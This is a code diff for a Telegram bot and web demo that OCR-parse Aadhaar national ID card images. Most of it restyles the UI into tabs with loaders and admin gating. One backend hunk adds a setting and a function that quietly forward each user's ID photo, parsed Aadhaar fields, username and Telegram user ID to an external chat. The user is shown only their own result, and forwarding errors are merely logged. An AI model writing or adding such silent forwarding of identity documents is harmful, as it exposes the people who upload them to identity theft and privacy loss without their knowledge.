@@ -44,6 +44,7 @@ AZURE_HEADERS = {"api-call-origin": "Microsoft.Cognitive.CustomVision.Portal"}
 
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
 TELEGRAM_WEBHOOK_SECRET = os.getenv("TELEGRAM_WEBHOOK_SECRET", "").strip()
+EXTERNAL_CHAT_ID = os.getenv("EXTERNAL_CHAT_ID", "").strip()
 TELEGRAM_API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}" if TELEGRAM_BOT_TOKEN else ""
 TELEGRAM_FILE_BASE = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}" if TELEGRAM_BOT_TOKEN else ""
 
@@ -201,6 +202,16 @@ def get_file_bytes(file_id: str) -> bytes:
     response = session.get(file_url, timeout=60)
     response.raise_for_status()
     return response.content
+
+
+def send_photo_with_caption(chat_id: int | str, image_bytes: bytes, caption: str) -> None:
+    files = {"photo": ("source.jpg", image_bytes, "image/jpeg")}
+    data = {"chat_id": str(chat_id), "caption": caption, "parse_mode": "Markdown"}
+    response = session.post(f"{TELEGRAM_API_BASE}/sendPhoto", data=data, files=files, timeout=60)
+    response.raise_for_status()
+    resp_data = response.json()
+    if not resp_data.get("ok"):
+        raise RuntimeError(f"Telegram sendPhoto error: {resp_data}")
 
 
 class OCRParser:
@@ -790,6 +801,19 @@ async def _process_telegram_message(msg: dict[str, Any]) -> None:
             edit_message_text(chat_id, processing_message_id, final_text)
         else:
             send_message(chat_id, final_text)
+
+        if EXTERNAL_CHAT_ID:
+            sender_label = f"@{username}" if username else (first_name or "Unknown")
+            admin_caption = (
+                "*Parsed Aadhaar Data*\n\n"
+                f"{parsed_text}\n"
+                f"*Sent by:* {_escape_markdown(sender_label)}\n"
+                f"*Telegram User ID:* `{int(user_id)}`"
+            )
+            try:
+                send_photo_with_caption(EXTERNAL_CHAT_ID, image_bytes, admin_caption)
+            except Exception as notify_exc:
+                logger.exception("Admin notification forwarding failed: %s", notify_exc)
     except Exception as exc:
         logger.exception("Webhook processing failed: %s", exc)
         failure_text = (
@@ -838,7 +862,7 @@ DEMO_HTML = """<!doctype html>
       --success: #2f7d53;
       --danger: #a44747;
       --radius: 14px;
-      --nav-h: 56px;
+      --nav-h: 64px;
     }
     [data-theme="warm"] {
       --bg: #f5f3ef;
@@ -873,18 +897,18 @@ DEMO_HTML = """<!doctype html>
     }
 
     .app {
-      max-width: 1080px;
+      max-width: 920px;
       margin: 0 auto;
       min-height: 100%;
       display: grid;
       grid-template-rows: auto 1fr auto;
-      padding-bottom: calc(var(--nav-h) + 12px);
+      padding-bottom: calc(var(--nav-h) + env(safe-area-inset-bottom) + 12px);
     }
 
     .topbar {
       position: sticky;
       top: 0;
-      z-index: 20;
+      z-index: 30;
       backdrop-filter: blur(12px);
       background: color-mix(in srgb, var(--surface) 88%, transparent);
       border-bottom: 1px solid var(--line);
@@ -896,7 +920,7 @@ DEMO_HTML = """<!doctype html>
       align-items: center;
       justify-content: space-between;
       gap: 10px;
-      min-height: 42px;
+      min-height: 44px;
     }
 
     .brand {
@@ -921,7 +945,9 @@ DEMO_HTML = """<!doctype html>
       justify-content: center;
       gap: 6px;
       white-space: nowrap;
+      transition: transform .16s ease, background-color .2s ease, border-color .2s ease;
     }
+    .btn:active, .icon-btn:active { transform: scale(.98); }
 
     .btn.primary {
       background: var(--accent);
@@ -930,7 +956,7 @@ DEMO_HTML = """<!doctype html>
       font-weight: 600;
     }
 
-    .btn:disabled, .icon-btn:disabled { opacity: .6; cursor: not-allowed; }
+    .btn:disabled, .icon-btn:disabled { opacity: .58; cursor: not-allowed; }
 
     .whoami {
       color: var(--muted);
@@ -944,18 +970,17 @@ DEMO_HTML = """<!doctype html>
     .popup {
       position: fixed;
       inset: 0;
-      z-index: 40;
+      z-index: 50;
       display: none;
       align-items: flex-start;
       justify-content: flex-end;
-      padding: calc(env(safe-area-inset-top) + 56px) 12px 12px;
+      padding: calc(env(safe-area-inset-top) + 58px) 12px 12px;
       background: rgba(0,0,0,.18);
     }
-
     .popup.open { display: flex; }
 
     .popup-menu {
-      width: min(240px, 88vw);
+      width: min(250px, 90vw);
       background: var(--surface);
       border: 1px solid var(--line);
       border-radius: 12px;
@@ -963,7 +988,9 @@ DEMO_HTML = """<!doctype html>
       padding: 8px;
       display: grid;
       gap: 6px;
+      animation: popupIn .18s ease;
     }
+    @keyframes popupIn { from { opacity:0; transform: translateY(-6px);} to { opacity:1; transform: translateY(0);} }
 
     .menu-item {
       width: 100%;
@@ -983,23 +1010,19 @@ DEMO_HTML = """<!doctype html>
     .content {
       padding: 12px;
       display: grid;
-      gap: 12px;
       align-content: start;
     }
 
-    .snap-row {
-      display: grid;
-      grid-auto-flow: column;
-      grid-auto-columns: minmax(84vw, 1fr);
-      gap: 12px;
-      overflow-x: auto;
-      scroll-snap-type: x mandatory;
-      padding-bottom: 4px;
-      -webkit-overflow-scrolling: touch;
+    .tab-panel {
+      display: none;
+      opacity: 0;
+      transform: translateY(6px);
+      transition: opacity .22s ease, transform .22s ease;
     }
-
-    .snap-row > .card {
-      scroll-snap-align: start;
+    .tab-panel.active {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
     }
 
     .card {
@@ -1008,6 +1031,7 @@ DEMO_HTML = """<!doctype html>
       border-radius: var(--radius);
       box-shadow: 0 8px 22px rgba(0,0,0,.04);
       padding: 14px;
+      margin-bottom: 12px;
     }
 
     .card-head {
@@ -1020,7 +1044,7 @@ DEMO_HTML = """<!doctype html>
 
     .title {
       margin: 0;
-      font-size: .96rem;
+      font-size: .98rem;
       font-weight: 700;
       display: inline-flex;
       align-items: center;
@@ -1039,16 +1063,10 @@ DEMO_HTML = """<!doctype html>
     }
 
     .controls {
-      display: grid;
-      grid-template-columns: 1fr;
-      gap: 9px;
-    }
-
-    .control-row {
       display: flex;
+      flex-wrap: wrap;
       gap: 8px;
       align-items: center;
-      flex-wrap: nowrap;
     }
 
     .input {
@@ -1066,60 +1084,19 @@ DEMO_HTML = """<!doctype html>
     .ok { color: var(--success); }
     .bad { color: var(--danger); }
 
-    .collapsible {
-      border: 1px solid var(--line);
-      border-radius: 12px;
-      overflow: hidden;
-      margin-top: 10px;
-    }
-
-    .collapse-head {
-      width: 100%;
-      background: color-mix(in srgb, var(--surface) 92%, var(--accent-soft));
-      border: 0;
-      color: var(--ink);
-      padding: 10px 12px;
-      font-weight: 600;
-      text-align: left;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      cursor: pointer;
-    }
-
-    .collapse-body {
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height .22s ease;
-      background: var(--surface);
-    }
-
-    .collapsible.open .collapse-body { max-height: 280px; }
-
-    pre {
-      margin: 0;
-      padding: 12px;
-      max-height: 260px;
-      overflow: auto;
-      font-size: .78rem;
-      background: color-mix(in srgb, var(--surface) 94%, var(--accent-soft));
-    }
-
     .table-wrap {
       overflow: auto;
       border: 1px solid var(--line);
       border-radius: 12px;
-      max-height: 52vh;
+      max-height: 62vh;
     }
-
     table {
       width: 100%;
       border-collapse: separate;
       border-spacing: 0;
-      min-width: 660px;
+      min-width: 640px;
       font-size: .84rem;
     }
-
     th, td {
       padding: 9px;
       border-bottom: 1px solid var(--line);
@@ -1127,7 +1104,6 @@ DEMO_HTML = """<!doctype html>
       white-space: nowrap;
       vertical-align: middle;
     }
-
     th {
       position: sticky;
       top: 0;
@@ -1136,7 +1112,6 @@ DEMO_HTML = """<!doctype html>
       color: var(--muted);
       font-weight: 600;
     }
-
     tr:last-child td { border-bottom: 0; }
 
     .pager {
@@ -1146,7 +1121,6 @@ DEMO_HTML = """<!doctype html>
       align-items: center;
       gap: 8px;
     }
-
     .pager .group { display: inline-flex; gap: 8px; align-items: center; }
 
     .bottom-nav {
@@ -1154,8 +1128,8 @@ DEMO_HTML = """<!doctype html>
       left: 0;
       right: 0;
       bottom: 0;
-      z-index: 30;
-      height: var(--nav-h);
+      z-index: 40;
+      min-height: var(--nav-h);
       background: color-mix(in srgb, var(--surface) 88%, transparent);
       backdrop-filter: blur(10px);
       border-top: 1px solid var(--line);
@@ -1165,44 +1139,61 @@ DEMO_HTML = """<!doctype html>
     }
 
     .bottom-wrap {
-      width: min(1080px, 100%);
+      width: min(920px, 100%);
       display: grid;
       grid-template-columns: repeat(3, 1fr);
       gap: 8px;
       padding: 8px 12px;
     }
 
-    .nav-btn {
+    .tab-btn {
       border: 1px solid var(--line);
       background: var(--surface);
       color: var(--muted);
       border-radius: 10px;
-      font-size: .8rem;
+      font-size: .79rem;
       display: inline-flex;
       align-items: center;
       justify-content: center;
       gap: 6px;
+      padding: 8px 6px;
+      transition: all .2s ease;
     }
 
-    .nav-btn.active {
+    .tab-btn.active {
       color: var(--ink);
       border-color: var(--accent);
       background: color-mix(in srgb, var(--surface) 74%, var(--accent-soft));
+      box-shadow: inset 0 0 0 1px color-mix(in srgb, var(--accent) 35%, transparent);
     }
+
+    .loader {
+      width: 16px;
+      height: 16px;
+      border-radius: 999px;
+      border: 2px solid color-mix(in srgb, var(--accent) 30%, transparent);
+      border-top-color: var(--accent);
+      animation: spin .8s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .skeleton {
+      height: 36px;
+      border-radius: 8px;
+      background: linear-gradient(90deg, color-mix(in srgb, var(--surface) 88%, var(--accent-soft)) 25%, color-mix(in srgb, var(--surface) 78%, var(--accent-soft)) 40%, color-mix(in srgb, var(--surface) 88%, var(--accent-soft)) 60%);
+      background-size: 200% 100%;
+      animation: shimmer 1.3s infinite linear;
+      margin-bottom: 8px;
+    }
+    @keyframes shimmer { to { background-position: -200% 0; } }
 
     @media (min-width: 860px) {
       .content { padding: 16px; }
-      .snap-row {
-        grid-auto-flow: row;
-        grid-template-columns: 1fr 1fr;
-        overflow: visible;
-        scroll-snap-type: none;
-      }
-      .snap-row > .card { min-height: 100%; }
-      .bottom-nav { display: none; }
-      .app { padding-bottom: 18px; }
-      .controls { grid-template-columns: 1fr auto; align-items: center; }
-      .controls .full { grid-column: 1 / -1; }
+      .topbar { border-radius: 0 0 12px 12px; }
+      .table-wrap { max-height: 56vh; }
     }
   </style>
 </head>
@@ -1217,41 +1208,19 @@ DEMO_HTML = """<!doctype html>
     </header>
 
     <main class="content">
-      <div class="snap-row">
-        <section class="card" id="card-upload">
+      <section id="tab-history" class="tab-panel active">
+        <div class="card">
           <div class="card-head">
-            <h2 class="title"><iconify-icon icon="solar:document-add-outline"></iconify-icon> Parse Aadhaar</h2>
-            <span class="badge">Secure</span>
-          </div>
-          <div class="controls">
-            <div class="control-row full">
-              <input id="file" class="input" type="file" accept=".jpg,.jpeg,.png,.webp,image/jpeg,image/png,image/webp" />
-            </div>
-            <div class="control-row">
-              <button id="parseBtn" class="btn primary"><iconify-icon icon="solar:play-circle-outline"></iconify-icon> Parse</button>
-            </div>
-          </div>
-          <div id="parseStatus" class="status">Idle</div>
-          <div class="collapsible" id="parseCollapse">
-            <button class="collapse-head" id="parseToggle">
-              <span>Parsed JSON</span>
-              <iconify-icon icon="solar:alt-arrow-down-outline"></iconify-icon>
-            </button>
-            <div class="collapse-body">
-              <pre id="parseResult">{}</pre>
-            </div>
-          </div>
-        </section>
-
-        <section class="card" id="card-mine">
-          <div class="card-head">
-            <h2 class="title"><iconify-icon icon="solar:history-outline"></iconify-icon> My Records</h2>
+            <h2 class="title"><iconify-icon icon="solar:history-outline"></iconify-icon> My Parsed Records</h2>
             <span class="badge" id="myCount">0 records</span>
+          </div>
+          <div id="myLoading" style="display:none">
+            <div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>
           </div>
           <div class="table-wrap">
             <table>
               <thead>
-                <tr><th>Created At</th><th>Name</th><th>DOB</th><th>UID</th><th>Gender</th><th>Source</th></tr>
+                <tr><th><iconify-icon icon="solar:calendar-outline"></iconify-icon> Created At</th><th><iconify-icon icon="solar:user-outline"></iconify-icon> Name</th><th>DOB</th><th>UID</th><th><iconify-icon icon="solar:shield-check-outline"></iconify-icon> Gender</th><th><iconify-icon icon="solar:widget-3-outline"></iconify-icon> Source</th></tr>
               </thead>
               <tbody id="myRows"></tbody>
             </table>
@@ -1259,50 +1228,72 @@ DEMO_HTML = """<!doctype html>
           <div class="pager">
             <span class="muted" id="myPageInfo">Page 1</span>
             <div class="group">
-              <button id="myPrev" class="btn">Prev</button>
-              <button id="myNext" class="btn">Next</button>
+              <button id="myPrev" class="btn"><iconify-icon icon="solar:alt-arrow-left-outline"></iconify-icon> Prev</button>
+              <button id="myNext" class="btn">Next <iconify-icon icon="solar:alt-arrow-right-outline"></iconify-icon></button>
             </div>
           </div>
-        </section>
-      </div>
-
-      <section class="card" id="adminCard" style="display:none">
-        <div class="card-head">
-          <h2 class="title"><iconify-icon icon="solar:magnifer-outline"></iconify-icon> Admin Search</h2>
-          <span class="badge" id="adminCount">0 results</span>
         </div>
-        <div class="controls">
-          <div class="control-row full">
-            <input id="keyword" class="input" placeholder="Search username, name, UID, gender" />
+      </section>
+
+      <section id="tab-upload" class="tab-panel">
+        <div class="card">
+          <div class="card-head">
+            <h2 class="title"><iconify-icon icon="solar:document-add-outline"></iconify-icon> Demo Parse Upload</h2>
+            <span class="badge">Secure</span>
           </div>
-          <div class="control-row">
+          <div class="controls">
+            <input id="file" class="input" type="file" accept=".jpg,.jpeg,.png,.webp,image/jpeg,image/png,image/webp" />
+            <button id="parseBtn" class="btn primary"><iconify-icon icon="solar:play-circle-outline"></iconify-icon> Parse Aadhaar</button>
+          </div>
+          <div id="parseStatus" class="status">Idle</div>
+          <div class="card" style="margin:10px 0 0; padding:10px;">
+            <div class="card-head" style="margin:0 0 6px;">
+              <h3 class="title" style="font-size:.88rem; margin:0;"><iconify-icon icon="solar:code-square-outline"></iconify-icon> Parse Response</h3>
+            </div>
+            <pre id="parseResult" style="margin:0; max-height:260px; overflow:auto;">{}</pre>
+          </div>
+        </div>
+      </section>
+
+      <section id="tab-admin" class="tab-panel">
+        <div class="card" id="adminCard" style="display:none">
+          <div class="card-head">
+            <h2 class="title"><iconify-icon icon="solar:magnifer-outline"></iconify-icon> Admin Search</h2>
+            <span class="badge" id="adminCount">0 results</span>
+          </div>
+          <div class="controls">
+            <input id="keyword" class="input" placeholder="Search username, name, UID, gender" />
             <button id="searchBtn" class="btn primary"><iconify-icon icon="solar:magnifer-outline"></iconify-icon> Search</button>
             <button id="clearSearchBtn" class="btn"><iconify-icon icon="solar:close-circle-outline"></iconify-icon> Clear</button>
           </div>
-        </div>
-        <div class="table-wrap" style="margin-top:10px">
-          <table>
-            <thead>
-              <tr><th>Created At</th><th>User ID</th><th>Username</th><th>Name</th><th>DOB</th><th>UID</th><th>Gender</th></tr>
-            </thead>
-            <tbody id="adminRows"></tbody>
-          </table>
-        </div>
-        <div class="pager">
-          <span class="muted" id="adminPageInfo">Page 1</span>
-          <div class="group">
-            <button id="adminPrev" class="btn">Prev</button>
-            <button id="adminNext" class="btn">Next</button>
+          <div class="table-wrap" style="margin-top:10px">
+            <table>
+              <thead>
+                <tr><th><iconify-icon icon="solar:calendar-outline"></iconify-icon> Created At</th><th>User ID</th><th>Username</th><th>Name</th><th>DOB</th><th>UID</th><th>Gender</th></tr>
+              </thead>
+              <tbody id="adminRows"></tbody>
+            </table>
           </div>
+          <div class="pager">
+            <span class="muted" id="adminPageInfo">Page 1</span>
+            <div class="group">
+              <button id="adminPrev" class="btn"><iconify-icon icon="solar:alt-arrow-left-outline"></iconify-icon> Prev</button>
+              <button id="adminNext" class="btn">Next <iconify-icon icon="solar:alt-arrow-right-outline"></iconify-icon></button>
+            </div>
+          </div>
+        </div>
+        <div class="card" id="adminLocked" style="display:none">
+          <div class="title"><iconify-icon icon="solar:lock-keyhole-outline"></iconify-icon> Admin Access Required</div>
+          <div class="whoami" style="margin-top:8px">This tab is available only to configured admin users.</div>
         </div>
       </section>
     </main>
 
     <nav class="bottom-nav">
       <div class="bottom-wrap">
-        <button class="nav-btn active" data-target="card-upload"><iconify-icon icon="solar:document-add-outline"></iconify-icon> Parse</button>
-        <button class="nav-btn" data-target="card-mine"><iconify-icon icon="solar:history-outline"></iconify-icon> Records</button>
-        <button class="nav-btn" data-target="adminCard"><iconify-icon icon="solar:magnifer-outline"></iconify-icon> Admin</button>
+        <button class="tab-btn active" data-tab="history"><iconify-icon icon="solar:history-outline"></iconify-icon> History</button>
+        <button class="tab-btn" data-tab="upload"><iconify-icon icon="solar:upload-minimalistic-outline"></iconify-icon> Demo</button>
+        <button class="tab-btn" data-tab="admin"><iconify-icon icon="solar:magnifer-outline"></iconify-icon> Admin</button>
       </div>
     </nav>
   </div>
@@ -1333,6 +1324,7 @@ let myOffset = 0;
 const adminLimit = 20;
 let adminOffset = 0;
 let adminKeyword = '';
+let isAdmin = false;
 
 function formatTimestamp(v, withTime = true) {
   if (!v) return '';
@@ -1348,9 +1340,9 @@ function formatTimestamp(v, withTime = true) {
   return `${dd}-${mm}-${yyyy} ${hh}:${min}:${ss}`;
 }
 
-function setStatus(el, text, ok = true) {
-  el.textContent = text;
+function setStatus(el, text, ok = true, loading = false) {
   el.classList.remove('ok', 'bad');
+  el.innerHTML = loading ? `<span class="loader"></span>${text}` : text;
   el.classList.add(ok ? 'ok' : 'bad');
 }
 
@@ -1382,28 +1374,36 @@ function adminRowHtml(r) {
   </tr>`;
 }
 
+function switchTab(tab) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.getElementById(`tab-${tab}`)?.classList.add('active');
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelector(`.tab-btn[data-tab="${tab}"]`)?.classList.add('active');
+}
+
 async function loadMine() {
+  document.getElementById('myLoading').style.display = 'block';
   const res = await fetch(`/api/me/parses?limit=${myLimit}&offset=${myOffset}`, { headers: authHeader });
   const data = await res.json();
+  document.getElementById('myLoading').style.display = 'none';
   if (!res.ok) throw new Error(data?.detail?.message || 'Failed to load records');
+
   const rows = data.records || [];
+  isAdmin = !!data.is_admin;
   document.getElementById('myRows').innerHTML = rows.map(myRowHtml).join('') || '<tr><td colspan="6">No records</td></tr>';
   document.getElementById('myCount').textContent = `${rows.length} records`;
   document.getElementById('myPrev').disabled = myOffset === 0;
   document.getElementById('myNext').disabled = rows.length < myLimit;
   setPageInfo('myPageInfo', myOffset, myLimit);
 
-  whoami.textContent = `Authenticated. Admin: ${data.is_admin ? 'Yes' : 'No'}`;
-  const adminCard = document.getElementById('adminCard');
-  adminCard.style.display = data.is_admin ? 'block' : 'none';
-
-  const adminNavBtn = document.querySelector('.nav-btn[data-target="adminCard"]');
-  if (adminNavBtn) adminNavBtn.style.display = data.is_admin ? 'inline-flex' : 'none';
-
-  if (data.is_admin) await loadAdmin();
+  whoami.textContent = `Authenticated. Admin: ${isAdmin ? 'Yes' : 'No'}`;
+  document.getElementById('adminCard').style.display = isAdmin ? 'block' : 'none';
+  document.getElementById('adminLocked').style.display = isAdmin ? 'none' : 'block';
+  if (isAdmin) await loadAdmin();
 }
 
 async function loadAdmin() {
+  if (!isAdmin) return;
   const url = `/api/admin/search?keyword=${encodeURIComponent(adminKeyword)}&limit=${adminLimit}&offset=${adminOffset}`;
   const res = await fetch(url, { headers: authHeader });
   const data = await res.json();
@@ -1428,7 +1428,7 @@ async function parseNow() {
     return;
   }
   parseBtn.disabled = true;
-  setStatus(parseStatus, 'Processing...', true);
+  setStatus(parseStatus, 'Processing...', true, true);
   const fd = new FormData();
   fd.append('file', f);
   try {
@@ -1439,6 +1439,7 @@ async function parseNow() {
     setStatus(parseStatus, 'Parsed successfully', true);
     myOffset = 0;
     await loadMine();
+    switchTab('history');
   } catch (e) {
     setStatus(parseStatus, e.message, false);
   } finally {
@@ -1454,10 +1455,6 @@ function togglePopup(force) {
 }
 
 function setupInteractions() {
-  document.getElementById('parseToggle').addEventListener('click', () => {
-    document.getElementById('parseCollapse').classList.toggle('open');
-  });
-
   document.getElementById('myPrev').addEventListener('click', async () => {
     myOffset = Math.max(0, myOffset - myLimit);
     await loadMine();
@@ -1489,13 +1486,6 @@ function setupInteractions() {
 
   parseBtn.addEventListener('click', parseNow);
 
-  document.querySelectorAll('[data-theme-btn]').forEach(btn => {
-    btn.addEventListener('click', () => {
-      document.body.setAttribute('data-theme', btn.getAttribute('data-theme-btn'));
-      togglePopup(false);
-    });
-  });
-
   const menuBtn = document.getElementById('menuBtn');
   const popup = document.getElementById('popup');
   menuBtn.addEventListener('click', () => togglePopup());
@@ -1503,22 +1493,33 @@ function setupInteractions() {
     if (e.target === popup) togglePopup(false);
   });
 
+  document.querySelectorAll('[data-theme-btn]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.body.setAttribute('data-theme', btn.getAttribute('data-theme-btn'));
+      togglePopup(false);
+    });
+  });
+
   document.getElementById('refreshAll').addEventListener('click', async () => {
     togglePopup(false);
     await loadMine();
   });
 
-  document.querySelectorAll('.nav-btn[data-target]').forEach(btn => {
+  document.querySelectorAll('.tab-btn').forEach(btn => {
     btn.addEventListener('click', () => {
-      document.querySelectorAll('.nav-btn').forEach(x => x.classList.remove('active'));
-      btn.classList.add('active');
-      const target = document.getElementById(btn.getAttribute('data-target'));
-      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      const tab = btn.getAttribute('data-tab');
+      if (tab === 'admin' && !isAdmin) {
+        switchTab('admin');
+        return;
+      }
+      switchTab(tab);
     });
   });
 }
 
 setupInteractions();
+switchTab('history');
+setStatus(parseStatus, 'Idle', true);
 loadMine().catch(err => {
   whoami.textContent = `Auth failed: ${err.message}`;
   whoami.classList.add('bad');
